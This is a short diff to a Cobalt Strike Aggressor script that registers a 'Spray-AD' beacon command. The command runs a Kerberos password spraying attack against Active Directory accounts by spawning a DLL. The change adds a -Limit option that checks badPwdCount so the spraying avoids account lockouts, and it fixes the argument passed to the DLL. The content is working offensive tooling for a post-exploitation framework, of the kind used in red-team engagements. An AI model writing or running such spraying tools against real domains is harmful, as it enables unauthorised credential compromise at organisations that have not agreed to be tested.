@@ -4,8 +4,10 @@
 
 #register help
 beacon_command_register("Spray-AD", "Perform a Kerberos password spraying attack against Active Directory.",
-	"Test all enabled Active Directory useraccounts for valid passwords.\n\n" .
-	"Synopsis: Spray-AD [password]\n\n");
+	"Test all enabled Active Directory useraccounts for valid passwords.\n" .
+	"Use the -Limit flag to limit the possibility of user lockout, if limit is set to 0 it will not check the badPwdCount value.\n\n".
+	"Synopsis: Spray-AD [password]\n".
+	"Synopsis: Spray-AD [password] -Limit <max badPwdCount>\n");
 
 alias Spray-AD {
 	$bid = $1;
@@ -21,6 +23,6 @@ alias Spray-AD {
 	}
     else{
         blog($bid, "Let's start spraying useraccounts with password: " . $object . "\n");
-        bdllspawn($bid, script_resource("Spray-AD.dll"), $object, "Spray-AD", 5000, false);
+        bdllspawn($bid, script_resource("Spray-AD.dll"), $input, "Spray-AD", 5000, false);
 	}
 }
